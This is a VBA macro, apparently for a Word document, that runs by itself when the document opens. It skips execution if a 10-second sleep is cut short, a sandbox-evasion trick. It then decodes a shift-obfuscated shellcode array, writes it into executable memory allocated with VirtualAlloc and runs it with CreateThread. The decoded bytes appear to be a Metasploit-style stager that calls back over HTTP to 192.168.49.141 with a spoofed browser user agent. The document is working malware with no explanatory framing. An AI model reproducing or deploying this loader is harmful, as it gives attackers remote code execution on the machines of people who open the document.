Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Sub MyMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    

    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If
    
    buf = Array(254, 234, 145, 2, 2, 2, 98, 139, 231, 51, 212, 102, 141, 84, 50, 141, 84, 14, 141, 84, 22, 141, 116, 42, 17, 185, 76, 40, 51, 1, 51, 194, 174, 62, 99, 126, 4, 46, 34, 195, 209, 15, 3, 201, 75, 119, 241, 84, 141, 84, _
18, 141, 68, 62, 89, 3, 210, 141, 66, 122, 135, 194, 118, 78, 3, 210, 82, 141, 74, 26, 141, 90, 34, 3, 213, 135, 203, 118, 62, 75, 141, 54, 141, 3, 216, 51, 1, 51, 194, 195, 209, 15, 174, 3, 201, 58, 226, 119, 246, 5, _
127, 250, 61, 127, 38, 119, 226, 90, 141, 90, 38, 3, 213, 104, 141, 14, 77, 141, 90, 30, 3, 213, 141, 6, 141, 3, 210, 139, 70, 38, 38, 93, 93, 99, 91, 92, 83, 1, 226, 90, 97, 92, 141, 20, 235, 130, 1, 1, 1, 95, _
106, 112, 103, 118, 2, 106, 121, 107, 112, 107, 86, 106, 78, 121, 40, 9, 1, 215, 51, 221, 85, 85, 85, 85, 85, 234, 84, 2, 2, 2, 79, 113, 124, 107, 110, 110, 99, 49, 55, 48, 50, 34, 42, 79, 99, 101, 107, 112, 118, 113, _
117, 106, 61, 34, 75, 112, 118, 103, 110, 34, 79, 99, 101, 34, 81, 85, 34, 90, 34, 51, 52, 48, 52, 61, 34, 116, 120, 60, 59, 57, 48, 50, 43, 34, 73, 103, 101, 109, 113, 49, 52, 50, 51, 50, 50, 51, 50, 51, 34, 72, _
107, 116, 103, 104, 113, 122, 49, 59, 57, 48, 50, 2, 106, 60, 88, 123, 169, 1, 215, 85, 85, 108, 5, 85, 85, 106, 189, 3, 2, 2, 234, 190, 2, 2, 2, 49, 67, 100, 113, 91, 104, 89, 97, 105, 110, 51, 107, 90, 55, 55, _
100, 111, 59, 67, 53, 103, 103, 67, 124, 103, 102, 114, 91, 83, 83, 120, 68, 67, 55, 55, 109, 52, 110, 117, 72, 104, 78, 47, 111, 2, 82, 106, 89, 139, 161, 200, 1, 215, 139, 200, 85, 106, 2, 52, 234, 134, 85, 85, 85, 89, _
85, 88, 106, 237, 87, 48, 61, 1, 215, 152, 108, 12, 97, 106, 130, 53, 2, 2, 139, 226, 108, 6, 82, 108, 33, 88, 106, 119, 72, 160, 136, 1, 215, 85, 85, 85, 85, 88, 106, 47, 8, 26, 125, 1, 215, 135, 194, 119, 22, 106, _
138, 21, 2, 2, 106, 70, 242, 55, 226, 1, 215, 81, 119, 207, 234, 77, 2, 2, 2, 108, 66, 106, 2, 18, 2, 2, 106, 2, 2, 66, 2, 85, 106, 90, 166, 85, 231, 1, 215, 149, 85, 85, 139, 233, 89, 106, 2, 34, 2, 2, _
85, 88, 106, 20, 152, 139, 228, 1, 215, 135, 194, 118, 209, 141, 9, 3, 197, 135, 194, 119, 231, 90, 197, 97, 234, 109, 1, 1, 1, 51, 59, 52, 48, 51, 56, 58, 48, 54, 59, 48, 51, 54, 51, 2, 189, 226, 31, 44, 12, 106, _
168, 151, 191, 159, 1, 215, 62, 8, 126, 12, 130, 253, 226, 119, 7, 189, 73, 21, 116, 113, 108, 2, 85, 1, 215)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
    Next i
    

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
